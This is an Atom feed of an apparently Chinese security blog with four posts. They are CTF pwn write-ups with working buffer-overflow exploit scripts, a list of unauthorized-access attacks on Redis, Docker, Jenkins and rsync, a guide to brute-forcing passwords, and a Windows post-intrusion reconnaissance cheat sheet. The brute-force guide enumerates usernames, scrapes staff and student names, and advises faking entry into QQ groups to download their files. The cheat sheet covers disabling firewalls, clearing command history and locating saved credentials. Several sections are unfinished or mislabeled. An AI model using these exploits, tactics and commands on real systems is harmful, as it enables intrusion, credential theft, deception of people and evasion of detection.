<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://m0sway.github.io</id>
    <title>m0sway</title>
    <updated>2021-01-09T14:38:53.061Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://m0sway.github.io"/>
    <link rel="self" href="https://m0sway.github.io/atom.xml"/>
    <subtitle>m0sway&apos;s blog.</subtitle>
    <logo>https://m0sway.github.io/images/avatar.png</logo>
    <icon>https://m0sway.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, m0sway</rights>
    <entry>
        <title type="html"><![CDATA[BUU-PWN题详解]]></title>
        <id>https://m0sway.github.io/post/buu-pwn-ti-xiang-jie/</id>
        <link href="https://m0sway.github.io/post/buu-pwn-ti-xiang-jie/">
        </link>
        <updated>2021-01-09T13:22:42.000Z</updated>
        <content type="html"><![CDATA[<h1 id="test_your_nc">test_your_nc</h1>
<p>直接连接即可：<br>
<img src="https://m0sway.github.io/post-images/1610198782295.png" alt="" loading="lazy"></p>
<h1 id="rip">rip</h1>
<p>先用<code>checksec</code>来看下保护：<br>
<img src="https://m0sway.github.io/post-images/1610199038756.png" alt="" loading="lazy"><br>
是一个64位的程序，关闭了所有的保护，并且还有RWX segments<br>
拖进IDA里面查看，可以看到有一个名为<code>fun</code>的后门函数<br>
<img src="https://m0sway.github.io/post-images/1610199208012.png" alt="" loading="lazy"><br>
主函数如下：<br>
<img src="https://m0sway.github.io/post-images/1610199494886.png" alt="" loading="lazy"><br>
利用<code>gets</code>函数读取用户输入的数据，s参数离栈底部0xF个字节。<br>
so 就是一个ret2text的题目，代码如下：</p>
<pre><code>from pwn import *

#context.log_level='debug'
sys_addr = 0x401186
# r = process(&quot;./pwn1&quot;)
r = remote(&quot;node3.buuoj.cn&quot;,27439)
r.recv()
payload = b'M' * (0xf + 8)  + p64(sys_addr)
r.sendline(payload)

r.interactive()
</code></pre>
<h1 id="warmup_csaw_2016">warmup_csaw_2016</h1>
<p>先用<code>checksec</code>来看下保护：<br>
<img src="https://m0sway.github.io/post-images/1610201505036.png" alt="" loading="lazy"><br>
是一个64位的程序，关闭了所有的保护，并且还有RWX segments<br>
拖进IDA，主函数如下：<br>
<img src="https://m0sway.github.io/post-images/1610201597409.png" alt="" loading="lazy"><br>
可以看到输出了一个函数的地址，跟进函数看下<br>
<img src="https://m0sway.github.io/post-images/1610201773079.png" alt="" loading="lazy"><br>
是一个后门函数调用系统命令<code>cat flag</code>，所以我们应该就想办法调用这个函数。<br>
回到主函数看看，最后用<code>gets</code>函数向<code>v5</code>写入数据，那么就存在一个溢出。<br>
<code>v5</code>到栈底的距离是<code>0x40</code> so:</p>
<pre><code>from pwn import *

r = remote(&quot;node3.buuoj.cn&quot;,27089)
#r = process(&quot;./warmup_csaw_2016&quot;)
r.recvuntil(&quot;WOW:&quot;)
addr = int(r.recv(8).decode(),16)
print(addr)
payload = b'M' * (0x40 + 8) + p64(addr)
r.sendlineafter(&quot;&gt;&quot;,payload)

r.interactive()
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://m0sway.github.io/post-images/1610202191449.png" alt="" loading="lazy"></figure>
<h1 id="pwn1_sctf_2016">pwn1_sctf_2016</h1>
<p>先用<code>checksec</code>来看下保护：<br>
<img src="https://m0sway.github.io/post-images/1610202466424.png" alt="" loading="lazy"><br>
是一个32位的程序，NX enabled、Partial RELRO<br>
拖进IDA，主函数如下：<br>
<img src="https://m0sway.github.io/post-images/1610202490014.png" alt="" loading="lazy"><br>
存在漏洞的函数已经被标记出来了，直接跟进看：<br>
<img src="https://m0sway.github.io/post-images/1610202539464.png" alt="" loading="lazy"><br>
分配的s空间为60，限制输入32，初步看是不会造成栈溢出的，但是下面有一个字符替换，就是输入I会被替换成you。I是一个字符，you是三个字符，那么我们可以输入20个I（满足32的限制），那么这20个I，最终被替换成了60个字符，从而造成溢出</p>
<p>用F12搜索下全局的字符串，会发现有一个<code>cat flag.txt</code>，跟进获取到该函数的地址为<code>0x8048F0D</code><br>
<img src="https://m0sway.github.io/post-images/1610202762621.png" alt="" loading="lazy"><br>
代码如下：</p>
<pre><code>from pwn import *

r = remote(&quot;node3.buuoj.cn&quot;,25658)
payload = b'I'*20 + b'M'*4 + p32(0x8048F0D)
r.recv()
r.sendline(payload)

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[未授权访问漏洞总结]]></title>
        <id>https://m0sway.github.io/post/wei-shou-quan-fang-wen-lou-dong-zong-jie/</id>
        <link href="https://m0sway.github.io/post/wei-shou-quan-fang-wen-lou-dong-zong-jie/">
        </link>
        <updated>2020-10-22T06:40:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x01-redis未授权访问">0x01 Redis未授权访问</h3>
<p><strong>漏洞利用：</strong><br>
py工具写入ssh直接连接<br>
<strong>解决方法</strong><br>
方法一： 可以修改绑定的IP、端口和指定访问者IP。<br>
默认情况下，Redis 监听 127.0.0.1。如果仅仅是本地通信，请确保监听在本地，这种方式可以在一定程度上缓解 Redis 未授权访问的风险（例外情况下，如果 Redis 以 root 用户运行，攻击者借助已有的 webshell，就可以利用该 Redis 来反弹 shell 以实现提权）。<br>
只有本机才能访问 Redis：<br>
在 redis.conf 文件中找到 # bind 127.0.0.1，将前面的 # 去掉，然后保存。<br>
注意：该操作需要重启 Redis 才能生效。<br>
指定访问源 IP 来访问 Redis：<br>
<code>bind 192.168.1.100 10.0.0.1</code><br>
注意：该操作需要重启 Redis 才能生效。<br>
方法二： 设置访问密码<br>
在redis.conf 中找到 requirepass 字段，去掉其注释，并在后面填上需要的密码。Redis 客户端也需要使用此密码来访问 Redis 服务。<br>
打开 <code>/etc/redis/redis.conf</code>配置文件:<br>
<code>requirepass !QE%^E3323BDWEwwwe1839</code><br>
方法三： 设置防火墙策略<br>
如果正常业务中 Redis 服务需要被其他服务器来访问，可以通过 iptables 策略，仅允许指定的 IP 来访问 Redis 服务。<br>
<code>iptables -A INPUT -s x.x.x.x -p tcp --dport 6379 -j ACCEPT</code><br>
注意：x.x.x.x  修改为实际IP或者网段</p>
<h3 id="0x02-mongodb未授权访问">0x02 Mongodb未授权访问</h3>
<p><strong>漏洞利用：</strong><br>
安装mongodb，然后连接到服务。<br>
<code>mongo --host 10.2.20.34 --port 27017</code><br>
<strong>解决方法</strong><br>
方法一：可以修改端口和指定访问ip，也可以使用防火墙来配置访问策略。<br>
配置AUTH，做好访问认证。打开MongoDB配置文件（.conf），设置为auth=true；<br>
修改访问端口和指定访问ip。使其只监听私有IP（或本地IP），不监听任何公网IP或DNS。<br>
使用--bind_ip选项，该选项可以限制监听接口IP为特定的内网IP， 当在启动mongodb的时候<br>
使用 --bind_ip 10.0.0.1表示启动ip地址绑定，数据库实例将只监听10.0.0.1内网的请求。<br>
mongod --bind_ip 10.0.0.1<br>
方法二：<br>
在admin.system.users中添加用户，启动认证。<br>
#在admin 数据库中创建用户userbb， 密码为xy2020<br>
方法三： 设置防火墙策略<br>
如果正常业务中 MongoDB 服务需要被其他服务器来访问，可以通过 iptables 策略，仅允许指定的 IP 来访问服务。<br>
iptables -A INPUT -s x.x.x.x -p tcp --dport 27017 -j ACCEPT<br>
注意：x.x.x.x  修改为实际IP或者网段</p>
<h3 id="0x03-memcached未授权访问">0x03 Memcached未授权访问</h3>
<p><strong>漏洞利用：</strong><br>
<code>telnet &lt;target&gt; 11211</code> 或 <code>nc -vv &lt;target&gt; 11211</code><br>
使用了 stats 命令来输出 Memcached 服务信息等。<br>
<strong>解决方法</strong><br>
方法一： 可以修改绑定的IP、端口和指定访问者IP。<br>
Memcached没有在公网开放的必要，可在Memcached启动时指定绑定的IP地址为 127.0.0.1。例如，在Linux环境中运行以下命令：<br>
<code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code><br>
方法二： 增加Memcached的认证配置。<br>
```<br>
Memcached从1.4.3版本开始，支持SASL认证。</p>
<pre><code>    安装启动SASL服务，新增用户xy2020,密码也为XY2020

    # /etc/init.d/saslauthd start

    # /usr/sbin/testsaslauthd -u xy2020 -p XY2020

    # ./memcached -d -m 1024 -S -l 192.168.128.83 -p 11212 -u tuxedo
    ```
</code></pre>
<h3 id="0x04-zookeeper-未授权访问">0x04 ZooKeeper 未授权访问</h3>
<p><strong>漏洞利用：</strong><br>
安装ZooKeeper，然后连接到服务。</p>
<pre><code>        wget https://mirrors.bfsu.edu.cn/apache/zookeeper/zookeeper-3.6.2/apache-zookeeper-3.6.2-bin.tar.gz
        tar -xzvf  apache-zookeeper-3.6.2-bin.tar.gz
        cd apache-zookeeper-3.6.2-bin/bin
        ./zkCli.sh  -timeout 0 -r -server  10.10.10.10:2181
        备注：windows 下为：zkCli.cmd  -timeout 0 -r -server  10.10.4.72:2181
</code></pre>
<p><strong>解决方法</strong></p>
<h3 id="0x05-zookeeper-未授权访问">0x05 ZooKeeper 未授权访问</h3>
<p><strong>漏洞利用：</strong><br>
直接访问：<br>
<code>curl http://10.10.10.10:9200 curl http://10.10.10.10:9200/_cat</code><br>
<strong>解决方法</strong></p>
<h3 id="0x06-kibana-未授权访问">0x06 Kibana 未授权访问</h3>
<p><strong>漏洞利用：</strong><br>
直接访问<br>
<strong>解决方法</strong></p>
<h3 id="0x07-docker-未授权访问">0x07 Docker 未授权访问</h3>
<p><strong>漏洞利用：</strong><br>
```<br>
直接使用浏览器访问：<br>
http://10.10.10.10:2375/version<br>
http://10.10.10.10:2375/info</p>
<pre><code>        或者

    用docker进行操作(建议)：
        docker  -H tcp://10.10.10.10:2375 images
        //也就是直接连接进实例，然后进行提权操作
    ```
</code></pre>
<p><strong>解决方法</strong></p>
<h3 id="0x08-hadoop-未授权访问">0x08 Hadoop 未授权访问</h3>
<p><strong>漏洞利用：</strong><br>
直接访问：<br>
<code>http://10.10.10.10:8088/cluster</code><br>
<strong>解决方法</strong></p>
<h3 id="0x09-jenkins-未授权访问">0x09 Jenkins 未授权访问</h3>
<p><strong>漏洞利用：</strong><br>
直接访问：<br>
<code>http://10.10.10.10:8088/cluster</code><br>
<code>RCE执行方式：↓</code><br>
<code>println &quot;whoami&quot;.execute().text</code></p>
<p><strong>解决方法</strong></p>
<h3 id="0x10-springboot-actuator-未授权访问">0x10 Springboot actuator 未授权访问</h3>
<p><strong>漏洞利用：</strong></p>
<p><strong>解决方法</strong></p>
<h3 id="0x11-ftp-未授权访问">0x11 FTP 未授权访问</h3>
<p><strong>漏洞利用：</strong><br>
用FTP直接登录：<br>
帐号/密码：anonymouse/anonymouse<br>
<strong>解决方法</strong></p>
<h3 id="0x12-hadoop-未授权访问">0x12 Hadoop 未授权访问</h3>
<p><strong>漏洞利用：</strong></p>
<pre><code>        rsync rsync://{target_ip}/  #访问
        rsync rsync://{target_ip}/etc/passwd ./     #任意文件下载
</code></pre>
<p><strong>解决方法</strong></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[弱口令爆破]]></title>
        <id>https://m0sway.github.io/post/ruo-kou-ling-bao-po/</id>
        <link href="https://m0sway.github.io/post/ruo-kou-ling-bao-po/">
        </link>
        <updated>2020-10-06T14:23:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="1-用户名确定方法">1. 用户名确定方法</h3>
<p>因为一些网站登陆框，输入不存在的用户名，会提示：用户名不存在，请重新输入 (这种情况下其实就可以提一个用户名枚举的漏洞)。<br>
我们根据该信息可以枚举用户名，如果枚举的用户名很多的话，就可以用这些用户名，批量去撞弱口令,可以大大提高爆破成功率。</p>
<h4 id="11-用户名枚举漏洞">1.1 用户名枚举漏洞</h4>
<p>用户名枚举主要就是利用，输入存在用户名和不存在用户名时返回信息不同来确认。而用户名枚举，因为不是爆破同一个账号的密码，所以不容易引起系统，waf拦截还是很好用的。<br>
而登陆页面中可以输入用户名的地方有三处：登陆框，密码找回，注册</p>
<h4 id="某src注册接口">某src注册接口：</h4>
<p>注册接口，手机号存在会提示：用户名已存在。<br>
用户不存在，会提示：验证码以发送。<br>
虽然发送同一ip发起发送验证码请求过多会提示：验证码请求频繁，但是当手机号存在时依旧会提示：用户名已存在。<br>
从而造成注册手机号枚举。</p>
<h4 id="12-利用公开信息收集用户名">1.2 利用公开信息收集用户名</h4>
<p>搜索引擎收集：<br>
比如，收集高校学号信息</p>
<pre><code>site:*.test.edu.cn 学号
</code></pre>
<p>就能收集到很多，更进一步收集还有收集泄露的office文件，一般excel文件中比较多</p>
<pre><code>site:*.test.edu.cn filetype:xlsx 学号
site:*.test.edu.cn filetype:docx
</code></pre>
<p>企业公开信息：<br>
最近p神在小密圈分享了一个找用户名的小技巧：</p>
<pre><code>爆破弱口令的时候经常需要目标公司的员工姓名组成字典，但员工姓名字典从哪来呢？

大型公司（员工数量5k+），可以根据中国姓名拼音Top500来做。但是对于千人及以下的中小型创业公司就不是很灵了。

分享一种方法，适用于所有公司（尤其是科技公司），就是爬一下这个公司的专利信息列表。由于专利信息都是公开的，能找到大量人员真实姓名，而且多半是技术人员。

企查查和天眼查都可以做这个事情。
</code></pre>
<p>社交软件：<br>
比如我们可以搜索qq群：</p>
<pre><code>2020级清华大学通知群
某公司xx项目开发群
...
</code></pre>
<p>编造一下加群信息，进入群的瞬间打开文件，下载所有群文件....也许有意想不到的收获.</p>
<h3 id="2-密码生成">2. 密码生成</h3>
<p>密码生成主要使用一些小工具</p>
<h4 id="21-pydictor">2.1 <strong>pydictor</strong></h4>
<p>项目地址：https://github.com/LandGrey/pydictor<br>
该工具有很多模块，其中社会工程学字典模块，可以根据用户信息针对性生成字典：<br>
<code>python pydictor.py --sedb</code><br>
设置收集到的用户名，邮箱，生日等可以针对性的生成字典。<br>
该工具还有字典合并去重，字典编码等多种功能，也可以单独 编写扩展插件。</p>
<h4 id="22-杂七杂八的小工具">2.2 杂七杂八的小工具</h4>
<p>在线字典生成网站：<br>
https://www.bugku.com/mima/</p>
<h4 id="23-一些小尝试">2.3 一些小尝试</h4>
<p>常用手段出不来，可以试试：<br>
域名，用户名，企业名，后台名称加1-5位随机数字。<br>
如：htgl8899，zhangsan2020<br>
六位数字太费时间就不优先考虑了</p>
<h3 id="3存在验证码">3.存在验证码</h3>
<p>存在验证码，验证码过弱，或者存在绕过缺陷也是可以被爆破的</p>
<h4 id="31-验证码识别">3.1 验证码识别</h4>
<p><strong>pkavhttpfuzzer</strong><br>
验证码识别可以使用pkavhttpfuzzer，该工具可以识别一些特别简单的验证码<br>
也可以使用burp插件：https://github.com/c0ny1/captcha-killer<br>
调用第三方的打码平台接口<br>
比如这里调用：http://www.ttshitu.com/ 的识别接口，识别效果还是不错的。不过太贵了，一般渗透测试，不至于不至于...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Windows 系统信息收集]]></title>
        <id>https://m0sway.github.io/post/windows-xi-tong-xin-xi-shou-ji/</id>
        <link href="https://m0sway.github.io/post/windows-xi-tong-xin-xi-shou-ji/">
        </link>
        <updated>2020-09-03T07:43:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-本机信息">一、本机信息</h1>
<h3 id="1-系统程序">1、系统程序</h3>
<p>收集系统信息，包括操作系统版本，已安装补丁列表等。通常使用以下方法收集：</p>
<pre><code>net config workstation/server                                 # 查询简易系统信息
systeminfo                                                    # 查询全部内容
wmic qfe get Caption,Description,HotFixID,InstalledOn         # 查询已安装的补丁列表
</code></pre>
<p>注：其中systeminfo命令查询内容最全，但如果系统更新的补丁较多，可能会导致反应反应时间过长；使用 webshell 执行此命令可能会因为超时导致无法正常回显，或回显内容长度过长，无法全部显示。</p>
<h3 id="2-进程服务">2、进程服务</h3>
<pre><code>tasklist /v                              # 查询正在运行的进程
wmic product get name,version            # 查询所有安装过的软件及版本
powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;
# 使用 powershell 查询所有安装过的软件及版本，效果和 wmic 相同
wmic service list brief                  # 查询当前机器的服务信息
wmic startup get command,caption         # 查看启动项
schtasks  /query  /fo  LIST /v           # 查看任务计划
</code></pre>
<p>windows 自带防火墙及特殊过滤规则等网络访问均可使用<code>netsh</code>及相关命令查看。</p>
<pre><code>netsh firewall show config                      # 查看防火墙信息，但 firewall 命令已弃用，可使用 advfirewall 命令代替
netsh advfirewall firewall show rule name=all   # 查看配置规则
netsh advfirewall set allprofiles state off\on  # 关闭防火墙\开启防火墙
netsh advfirewall export\import xx.pol          # 导出\导入配置文件
netsh advfirewall firewall add rule name=”deny tcp 139″ dir=in protocol=tcp localport=139 action=block         # 新建规则阻止TCP协议139端口
netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow              # 新建规则允许3389通过防火墙
netsh advfirewall firewall delete rule name=Remote Desktop  # 删除名为Remote Desktop的规则
netsh interface                                 # 连接安全规则配置，很少配置。
</code></pre>
<h3 id="3-用户信息">3、用户信息</h3>
<pre><code>whoami                                   # 当前用户
quser                                    # 查询登录用户，同 query user
qwinsta                                  # 查询登录用户，同 query user
query user                               # 查询登录用户
query session                            # 查询会话
query termserver                         # 查询远程桌面主机列表。
net accounts                             # 查询域密码策略
net user                                 # 查询本地用户列表
net user &quot;$username&quot;                     # 查询指定用户
net localgroup                           # 查询本地用户组列表
net localgroup &quot;$groupname&quot;              # 查询指定用户组成员
net group                                # 仅域控可执行，查询用户组列表
net group &quot;$groupname&quot;                   # 仅域控可执行，查询用户组成员
</code></pre>
<p>注：quser、qwinsta和query命令只存在于允许安装 RDP 服务的主机上，官方描述其仅存在于 server 2012 及以上版本存在。其中query termserver命令存在问题，本地测试时与描述严重不符，无法列出信息。</p>
<h3 id="4-操作记录">4、操作记录</h3>
<p>cmd 和 powershell v3 以下的操作记录无法长时间保存，仅限当前窗口。</p>
<pre><code>Get-History | Format-List -Property *         # 查询 powershell 当前窗口历史操作记录
Clear-History                                 # 删除 powershell 当前窗口历史操作记录
Clear-History -Id 3                           # 删除 powershell 当前窗口指定 ID 的历史操作记录
doskey /h                                     # 查看 cmd 的历史操作记录
doskey /reinstall                             # 删除 cmd 的历史操作记录
</code></pre>
<p>可以通过向进程发送键盘内容的方式将运行中的窗口历史操作记录导出。</p>
<p>powershell v5 以上的操作历史记录会直接保存在指定文件中。直接查看即可。</p>
<pre><code>可以通过向进程发送键盘内容的方式将运行中的窗口历史操作记录导出。

powershell v5 以上的操作历史记录会直接保存在指定文件中。直接查看即可。
</code></pre>
<p>powershell v3、v4 版本需要安装<code>Get-PSReadlineOption</code>。<br>
<code>msiexec /q /i PackageManagement_x64.msi</code></p>
<h1 id="二-网络发现">二、网络发现</h1>
<p>内网网络发现是一个很重要的信息收集内容，一般情况下是不建议使用扫描器扫描，尤其不建议使用 nmap，当然，如果是靶场，或是甲方授权就另当别论。</p>
<h3 id="1-基本信息收集">1、基本信息收集</h3>
<pre><code>
ipconfig /all                     # 列出当前主机详细网络信息
ipconfig  /displaydns             # 列出dns缓存信息
route print                       # 查询路由表
arp -a                            # 地址解析协议缓存表
netstat -ano                      # 端口使用情况
net share                         # 查看共享信息
net view                          # 查看共享资源列表
wmic share get name,path,status   # 查看共享信息
# 查看 host 文件
type  c:\Windows\system32\drivers\etc\hosts
</code></pre>
<p>使用 arp 命令收集最近建立过连接的 ip，但是此方法在某些时候无法收集到网段外的 ip 地址。</p>
<h3 id="2-spn-信息收集">2、SPN 信息收集</h3>
<p>SPN：服务主体名称。使用 Kerberos 须为服务器注册 SPN，因此可以在内网中扫描 SPN，快速寻找内网中注册的服务，SPN 扫描可以规避像端口扫描的不确定性探测动作。</p>
<p>主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。</p>
<p>利用 Windows 自带的 setspn 工具</p>
<p>普通域用户权限执行即可</p>
<pre><code>setspn -T domain.com -Q /
</code></pre>
<p>利用 GetUserSPNs.vbs</p>
<p>使用 Rubeus 工具</p>
<h3 id="3-协议探测">3、协议探测</h3>
<h4 id="icmp-协议">icmp 协议</h4>
<p>直接回显</p>
<pre><code>for /l %i in (1,1,255) do @ ping 10.0.0.%i -w 1 -n 1|find /i &quot;ttl=&quot;
</code></pre>
<p>输出文件</p>
<pre><code>@for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.0.%i &amp; if errorlevel 1 (echo 192.168.0.%i &gt;&gt; ip.txt) else (echo 192.168.0.%i &gt;&gt; ip.txt)
</code></pre>
<h4 id="netbios-协议">Netbios 协议</h4>
<p>msf 扫描</p>
<pre><code>msf &gt; use auxiliary/scanner/netbios/nbname
</code></pre>
<p>nbtscan 扫描，下载：</p>
<pre><code>http://www.unixwiz.net/tools/nbtscan.html#download
</code></pre>
<p>参数：<code>-m 192.168.1.0/24</code></p>
<h4 id="udp-协议">UDP 协议</h4>
<p>msf</p>
<pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probemsf &gt; use auxiliary/scanner/discovery/udp_sweep
</code></pre>
<h4 id="smb-version">smb-version</h4>
<p>python版：<code>https://github.com/amitn322/smb-version</code><br>
c#版：<code>https://www.zcgonvh.com/post/CSharp_smb_version_Detection.html</code></p>
<h4 id="snmp-协议">SNMP 协议</h4>
<p>msf</p>
<pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
</code></pre>
<h3 id="4-系统日志">4、系统日志</h3>
<p>可以使用<code>wevtutil.exe psloglist.exe</code>或者 powershell 的<code>Get-WinEvent</code>模块进行日志导出，server 03 的域控可使用 eventquery.vbs 导出。</p>
<p>wevtutil 不需要 UAC， 支持很多过滤语法，若有需要请查看官方说明。</p>
<pre><code># 查询登录日志语法
wevtutil qe security /f:text /q:*[System[(EventID=4624)]]
# 查询所有登录、注销相关的日志语法
wevtutil qe security /rd:true /f:text /q:&quot;*[system/eventid=4624 and 4623 and 4627]&quot;
# 远程查询时在后面加入/r:computer /u:user /p:password 比如查询dc1上的登录注销日志
wevtutil qe security /rd:true /f:text /q:&quot;*[system/eventid=4624 and 4623 and 4672]&quot; /r:dc1 /u:administrator /p:password
</code></pre>
<p>本地使用 LogParser 日志分析工具整理导出的日志，然后去除重复数据、无效数据（以 '$' 结束的用户名）</p>
<pre><code>LogParser.exe -i:EVT -o txt &quot;SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,'|')) as USERNAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,'|')) as SOURCE_IP FROM C:\ProgramData\log.evtx&quot; &gt; C:\ProgramData\log.txt
</code></pre>
<p>导出域控登录日志到域控上:</p>
<pre><code>wevtutil epl Security C:\ProgramData\dc.evtx /q:&quot;*[EventData[Data[@Name='LogonType']='3'] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &lt;= 2592000000]]]&quot; /r:域控IP /u:域管 /p:域管密码
</code></pre>
<h3 id="5-浏览器日志">5、浏览器日志</h3>
<p>收集浏览器访问记录。</p>
<p>chrome</p>
<pre><code>C:\Users$username\AppData\Local\Google\Chrome\User Data\Default\History
</code></pre>
<p>firefox</p>
<pre><code>C:\Users$username\AppData\Roaming\Mozilla\Firefox\Profiles$name.default\places.sqlite
</code></pre>
<p>IE</p>
<pre><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs&quot; 或C:\Users$user\AppData\Local\Microsoft\Windows\History
</code></pre>
<p>edge, v79+:</p>
<pre><code>C:\Users$user\AppData\Local\Microsoft\Edge\User Data\Default\History
</code></pre>
<p>v44+</p>
<pre><code>C:\Users$user\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat
</code></pre>
<h3 id="6-dns-服务器记录">6、DNS 服务器记录</h3>
<p>如果目标机器在域内，只需要按部就班收集域信息，准备域横向渗透即可。</p>
<p>但其中有一点单独提一下，一般在域环境中都会有一台 DNS 服务器，小企业或内网环境较小的可能会和域控为同一台，大一些的企业，多为独立的 DNS 服务器。</p>
<p>由于 DNS 服务器的特性，因此，在 DNS 服务器上会存在大量内网地址解析记录，如果可以获取，会极大的方便内网拓扑展开，同时很多其他主机无法到达的地址，DNS 服务器是可以到达的。</p>
<p>列出 DNS 区域中当前节点的资源记录</p>
<p><code>dnscmd . /EnumZones</code></p>
<p>列出 test.com 的信息</p>
<p><code>dnscmd . /ZoneInfo test.com</code></p>
<p>列出 test.com 中的详细记录</p>
<p><code>dnscmd . /ZonePrint test.com</code></p>
<p>列出 test.com 中的记录</p>
<p><code>dnscmd . /EnumRecords test.com</code></p>
<p>DNS 记录有正向解析和反向解析两种。</p>
<p>正向解析是从域名到IP，反向解析则是从 IP 到域名。</p>
<p>反向隔离和正向隔离相同，都会有一个对应的区域，因此，查询方式与正向记录相同。</p>
<p>DNS 服务器还存在域传送漏洞。可以直接获得 DNS 记录。</p>
<pre><code>nslookup -type=all_ldap._tcp.dc.greyfinger.com

nslookup -type=ns domain.com

cmd&gt; nslookup server dns.domain.com ls domain.com
</code></pre>
<h1 id="三-域信息查询">三、域信息查询</h1>
<h3 id="1-基本信息收集-2">1、基本信息收集</h3>
<p>域信息收集，需要当前用户为域用户。本地用户无法执行域命令查询域内容。</p>
<pre><code>
net config workstation                    # 查询当前登录域
net time                                  # 同步时间，通常为域控服务器
net accounts /domain                      # 查询域密码策略
net user /domain                          # 列出当前域成员列表
net user username /domain                 # 列出域成员详细信息
net group /domain                         # 列出域内组列表
net group groupname /domain               # 列出域内组成员列表
net view                                  # 查询同一域内机器列表
net view /domain                          # 查询域列表
net view /domain:test                     # 查询 test 域中计算机列表
nltest /dclist:domain                     # 查询域内的所有DC
nltest /dsgetdc:domain                    # 拿到DC当前的认证信息
nltest /domain_trusts                     # 查询域信任信息
nltest /user:&quot;username&quot;                   # 得到用户信息
</code></pre>
<p>想要定位域管和域控机器，可以查询<code>domain admin</code>和<code>domain controllers</code>组，需要注意的是，组名会随系统语言变化而变化，如<code>domain controllers</code>会变化成<code>domaine contrôleurs</code>。</p>
<p>在域内其他机器上，查询组是<code>net group /domain</code>，而在域控上则是<code>net group</code>。</p>
<h3 id="2-dsquery">2、dsquery</h3>
<p>dsquery 命令很少使用，而且限制较大仅能在域控上执行，所以相对而言较为鸡肋，但是在一定条件下还是具有一定的使用价值。</p>
<pre><code>dsquery computer                          # 查询目录中的计算机
dsquery contact                           # 查询目录中的联系人
dsquery subnet                            # 查询目录中的子网
dsquery group                             # 查询目录中的组
dsquery site                              # 查询目录中的站点
dsquery user                              # 查询目录中的用户
</code></pre>
<h3 id="3-powershell">3、powershell</h3>
<pre><code># 查询当前Domain信息
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
# 查询域信任关系
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
# 查询当前林信息
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
# 查询林信任信息
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
</code></pre>
<h1 id="四-配置文件收集">四、配置文件收集</h1>
<h3 id="配置文件">配置文件</h3>
<p>IIS 配置文件路径为：</p>
<pre><code>%windir%\system32\inetsrv\config\applicationHost.config
</code></pre>
<p>使用 appcmd 的方式可以快速导出所需内容：</p>
<pre><code>%windir%\system32\inetsrv\appcmd list site /config %windir%\system32\inetsrv\appcmd list site /config /xml &gt; c:\sites.xml
</code></pre>
<h3 id="密码保存">密码保存</h3>
<h4 id="navicat">navicat</h4>
<table>
<thead>
<tr>
<th>数据库</th>
<th style="text-align:left">路径</th>
</tr>
</thead>
<tbody>
<tr>
<td>MySQL</td>
<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\Navicat\Servers\</td>
</tr>
<tr>
<td>MariaDB</td>
<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatMARIADB\Servers\</td>
</tr>
<tr>
<td>MongoDB</td>
<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatMONGODB\Servers\</td>
</tr>
<tr>
<td>Microsoft SQL</td>
<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatMSSQL\Servers\</td>
</tr>
<tr>
<td>Oracle</td>
<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatOra\Servers\</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatPG\Servers\</td>
</tr>
<tr>
<td>SQLite</td>
<td style="text-align:left">HKEYCURRENTUSER\Software\PremiumSoft\NavicatSQLite\Servers\</td>
</tr>
</tbody>
</table>
<h4 id="navicat-2">navicat</h4>
<table>
<thead>
<tr>
<th>系统版本</th>
<th style="text-align:left">路径</th>
</tr>
</thead>
<tbody>
<tr>
<td>xp/win2003</td>
<td style="text-align:left">C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</td>
</tr>
<tr>
<td>win7/win2008以上</td>
<td style="text-align:left">C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td>
</tr>
</tbody>
</table>
<h4 id="xshell">Xshell</h4>
<table>
<thead>
<tr>
<th>版本</th>
<th style="text-align:left">路径</th>
</tr>
</thead>
<tbody>
<tr>
<td>Xshell 5</td>
<td style="text-align:left">%userprofile%\Documents\NetSarang\Xshell\Sessions</td>
</tr>
<tr>
<td>Xshell 6</td>
<td style="text-align:left">%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td>
</tr>
</tbody>
</table>
<h4 id="winscp">WinSCP</h4>
<pre><code>HKCU\Software\Martin Prikryl\WinSCP 2\Sessions
</code></pre>
<h4 id="vnc">VNC:</h4>
<table>
<thead>
<tr>
<th>版本</th>
<th style="text-align:left">路径</th>
<th>类型</th>
</tr>
</thead>
<tbody>
<tr>
